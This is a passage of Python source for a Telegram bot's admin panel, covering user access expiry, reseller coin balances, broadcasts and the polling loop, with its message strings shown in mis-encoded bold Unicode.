            bot.reply_to(message, f"âš ï¸ ð—¨ð˜€ð—²ð—¿ {user_id}'ð˜€ ð—®ð—°ð—°ð—²ð˜€ð˜€ ð—°ð—®ð—»ð—»ð—¼ð˜ ð—¯ð—² ð—¿ð—²ð—±ð˜‚ð—°ð—²ð—± ð—³ð˜‚ð—¿ð˜ð—µð—²ð—¿!")
            return

        # Update user's expiration time
        users[user_id] = new_expiry.strftime('%Y-%m-%d %H:%M:%S')
        save_users()  # Save changes

        # Notify Admin
        bot.reply_to(message, f"âœ… ð—¨ð˜€ð—²ð—¿ {user_id}'ð˜€ ð—®ð—°ð—°ð—²ð˜€ð˜€ ð—µð—®ð˜€ ð—¯ð—²ð—²ð—» {change_type} ð—¯ð˜† {duration_value} {time_unit}.\n"
                              f"ðŸ“… ð—¡ð—²ð˜„ ð—˜ð˜…ð—½ð—¶ð—¿ð˜†: {convert_utc_to_ist(users[user_id])}")

        # Notify User
        bot.send_message(user_id, f"ðŸ”” ð—¬ð—¼ð˜‚ð—¿ ð—®ð—°ð—°ð—²ð˜€ð˜€ ð—µð—®ð˜€ ð—¯ð—²ð—²ð—» {change_type} ð—¯ð˜† {duration_value} {time_unit}.\n"
                                  f"ðŸ“… ð—¡ð—²ð˜„ ð—˜ð˜…ð—½ð—¶ð—¿ð˜†: {convert_utc_to_ist(users[user_id])}")

    except ValueError:
        bot.reply_to(message, "ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—¶ð—»ð—½ð˜‚ð˜!")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ RESELLERS PANEL SETTINGS ]------------------
        
@bot.message_handler(commands=['addreseller'])
def add_reseller_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        try:
            parts = message.text.split()
            if len(parts) != 3:
                raise ValueError("Invalid format")

            reseller_id, initial_coins = parts[1], int(parts[2])

            if reseller_id in resellers:
                bot.send_message(message.chat.id, f"â— ð—¨ð˜€ð—²ð—¿ {reseller_id} ð—¶ð˜€ ð—®ð—¹ð—¿ð—²ð—®ð—±ð˜† ð—® ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿.", parse_mode="Markdown")
                return

            if initial_coins < 0:
                raise ValueError("Negative coins not allowed")

            resellers[reseller_id] = {"coins": initial_coins}
            save_resellers()

            bot.send_message(message.chat.id, f"âœ… ð—¥ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ {reseller_id} ð—®ð—±ð—±ð—²ð—± ð˜„ð—¶ð˜ð—µ {initial_coins} ð—°ð—¼ð—¶ð—»ð˜€.", parse_mode="Markdown")
        except ValueError:
            bot.send_message(message.chat.id, "ð—¨ð˜€ð—²: `/addreseller <user_id> <coins>`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP.")

@bot.message_handler(commands=['removereseller'])
def remove_reseller_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        try:
            parts = message.text.split()
            if len(parts) != 2:
                raise ValueError("Invalid format")

            reseller_id = parts[1]

            if reseller_id in resellers:
                del resellers[reseller_id]
                save_resellers()
                bot.send_message(message.chat.id, f"âœ… ð—¥ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ {reseller_id} ð—¿ð—²ð—ºð—¼ð˜ƒð—²ð—± ð˜€ð˜‚ð—°ð—°ð—²ð˜€ð˜€ð—³ð˜‚ð—¹ð—¹ð˜†.", parse_mode="Markdown")
            else:
                bot.send_message(message.chat.id, f"â— ð—¨ð˜€ð—²ð—¿ {reseller_id} ð—¶ð˜€ ð—»ð—¼ð˜ ð—® ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿.", parse_mode="Markdown")
        except ValueError:
            bot.send_message(message.chat.id, "ð—¨ð˜€ð—²: `/removereseller <user_id>`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP.")

@bot.message_handler(commands=['addcoins'])
def add_coins_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        try:
            parts = message.text.split()
            if len(parts) != 3:
                raise ValueError("Invalid format")

            reseller_id, amount = parts[1], int(parts[2])

            if reseller_id not in resellers:
                bot.send_message(message.chat.id, f"â— ð—¨ð˜€ð—²ð—¿ {reseller_id} ð—¶ð˜€ ð—»ð—¼ð˜ ð—® ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿.", parse_mode="Markdown")
                return

            if amount < 0:
                raise ValueError("Negative coins not allowed")

            resellers[reseller_id]["coins"] += amount
            save_resellers()

            bot.send_message(message.chat.id, f"âœ… ð—”ð—±ð—±ð—²ð—± {amount} ð—°ð—¼ð—¶ð—»ð˜€\n ð—¥ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿: {reseller_id}\n ð—¡ð—²ð˜„ ð—¯ð—®ð—¹ð—®ð—»ð—°ð—²: {resellers[reseller_id]['coins']} ð—°ð—¼ð—¶ð—»ð˜€.", parse_mode="Markdown")
        except ValueError:
            bot.send_message(message.chat.id, "ð—¨ð˜€ð—²: `/addcoins <user_id> <amount>`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP.")

@bot.message_handler(commands=['deductcoins'])
def deduct_coins_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        try:
            parts = message.text.split()
            if len(parts) != 3:
                raise ValueError("Invalid format")

            reseller_id, amount = parts[1], int(parts[2])

            if reseller_id not in resellers:
                bot.send_message(message.chat.id, f"â— ð—¨ð˜€ð—²ð—¿ {reseller_id} ð—¶ð˜€ ð—»ð—¼ð˜ ð—® ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿.", parse_mode="Markdown")
                return

            if amount < 0:
                raise ValueError("Negative coins not allowed")

            if resellers[reseller_id]["coins"] < amount:
                bot.send_message(message.chat.id, f"â— ð—œð—»ð˜€ð˜‚ð—³ð—³ð—¶ð—°ð—¶ð—²ð—»ð˜ ð—°ð—¼ð—¶ð—»ð˜€! ð—¥ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ {reseller_id} ð—µð—®ð˜€ ð—¼ð—»ð—¹ð˜† {resellers[reseller_id]['coins']} ð—°ð—¼ð—¶ð—»ð˜€.", parse_mode="Markdown")
                return

            resellers[reseller_id]["coins"] -= amount
            save_resellers()

            bot.send_message(message.chat.id, f"âœ… ð——ð—²ð—±ð˜‚ð—°ð˜ð—²ð—± {amount} ð—°ð—¼ð—¶ð—»ð˜€ ð—³ð—¿ð—¼ð—º ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ {reseller_id}.\nðŸ†• ð—¡ð—²ð˜„ ð—¯ð—®ð—¹ð—®ð—»ð—°ð—²: {resellers[reseller_id]['coins']} ð—°ð—¼ð—¶ð—»ð˜€.", parse_mode="Markdown")
        except ValueError:
            bot.send_message(message.chat.id, "ð—¨ð˜€ð—²: `/deductcoins <user_id> <amount>`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
        
@bot.message_handler(func=lambda message: message.text == "Balance")
def check_balance_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        # If the user is an admin, show all resellers and their balances
        if not resellers:
            response = "â„¹ï¸ ð—¡ð—¼ ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ð˜€ ð—³ð—¼ð˜‚ð—»ð—±"
        else:
            response = "ðŸ“œ ð—¥ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ ð—•ð—®ð—¹ð—®ð—»ð—°ð—²ð˜€:\n"
            for reseller, data in resellers.items():
                response += f"ðŸ‘¤ `{reseller}` â†’ ðŸ’° {data['coins']} ð—°ð—¼ð—¶ð—»ð˜€\n"
    elif user_id in resellers:
        # If the user is a reseller, show their own balance
        balance = resellers[user_id]['coins']
        response = f"ðŸ’° ð—¬ð—¼ð˜‚ð—¿ ð—•ð—®ð—¹ð—®ð—»ð—°ð—²: {balance} ð—°ð—¼ð—¶ð—»ð˜€"
    else:
        # If the user is neither an admin nor a reseller, deny access
        response = "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—® ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ ð—¼ð—¿ ð—®ð—» ð—®ð—±ð—ºð—¶ð—»."

    bot.send_message(message.chat.id, response, parse_mode="Markdown")
    
# ------------------------------------------------------------
        

        
        
        
# --------------------[ BROADCAST SETTINGS ]------------------


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        response = "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP"
        bot.reply_to(message, response)
        return
    
    # Split the message to check for user ID or broadcast message
    msg_parts = message.text.split(" ", 2)

    if len(msg_parts) == 3:
        target_user_id = msg_parts[1]
        broadcast_message = msg_parts[2]

        try:
            target_user_id = int(target_user_id)  # Convert to int to verify it's a user ID
            bot.send_message(target_user_id, broadcast_message)
            response = f"ðŸ“¤ ð— ð—²ð˜€ð˜€ð—®ð—´ð—² ð˜€ð—²ð—»ð˜ ð˜ð—¼ ð˜‚ð˜€ð—²ð—¿ {target_user_id}."
        except ValueError:
            response = "â—ï¸ð—˜ð—¿ð—¿ð—¼ð—¿: ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð˜‚ð˜€ð—²ð—¿ ð—œð——."
    else:
        broadcast_message = msg_parts[1]
        # Send to all users (for example, keep track of all users in the users list)
        for user_id in users:
            try:
                bot.send_message(user_id, broadcast_message)
            except Exception as e:
                print(f"Failed to send message to {user_id}: {e}")

        response = "ðŸ“¤ ð— ð—²ð˜€ð˜€ð—®ð—´ð—² ð˜€ð—²ð—»ð˜ ð˜ð—¼ ð—®ð—¹ð—¹ ð˜‚ð˜€ð—²ð—¿ð˜€"

    bot.reply_to(message, response)


if __name__ == "__main__":
    print("âœ… Bot is active!... ")
    while True:
        load_data()
        try:
            bot.polling(none_stop=True, interval=0.5, timeout=10, long_polling_timeout=5)
        except Exception as e:
            print(e)
        
